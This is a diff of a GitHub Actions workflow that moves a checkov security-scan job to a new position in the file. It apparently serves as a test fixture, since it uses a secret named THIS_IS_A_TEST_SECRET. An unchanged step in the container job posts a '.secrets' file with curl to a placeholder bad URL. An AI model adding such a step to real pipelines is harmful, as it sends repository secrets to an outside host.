@@ -4,15 +4,6 @@ on:
   schedule:
     - cron: 0 0 * * 0
 jobs:
-   bridgecrew:
-    runs-on: ubuntu-latest
-    steps:
-    - name: Run checkov
-      id: checkov
-      uses: bridgecrewio/checkov-action@master
-      env:
-        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}
-        
    container-test-job:
     runs-on: ubuntu-latest
     container:
@@ -30,5 +21,14 @@ jobs:
         run:  | 
           (ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)
           curl -X POST -s --data "@.secrets" <BADURL > /dev/null
+          
+   bridgecrew:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run checkov
+      id: checkov
+      uses: bridgecrewio/checkov-action@master
+      env:
+        GITHUB_TOKEN: ${{secrets.THIS_IS_A_TEST_SECRET}}
 
 permissions: read-all
